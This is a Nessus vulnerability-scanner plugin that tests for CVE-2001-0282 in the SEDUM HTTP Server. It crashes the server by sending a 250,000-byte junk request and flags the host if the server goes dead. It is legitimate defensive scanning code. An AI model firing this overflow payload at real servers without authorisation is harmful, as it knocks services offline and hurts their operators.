#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10637);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2014/05/26 16:30:02 $");

 script_cve_id("CVE-2001-0282");
 script_bugtraq_id(2413);
 script_osvdb_id(11637);

 script_name(english:"SEDUM HTTP Server Long HTTP Request Overflow DoS");
 script_summary(english:"Crashes the remote web server");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote web server crash by sending it too
much data.

An attacker may use this flaw to prevent this host from fulfilling its
role.");
 script_set_attribute(attribute:"solution", value:"Contact your vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/02/23");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/03/25");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2014 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if (http_is_dead(port: port))
  exit(1, "The web server on port "+port+" is already dead");

req = crap(250000);
w = http_send_recv_buf(port: port, data: req);

if (http_is_dead(port: port))
  security_warning(port);
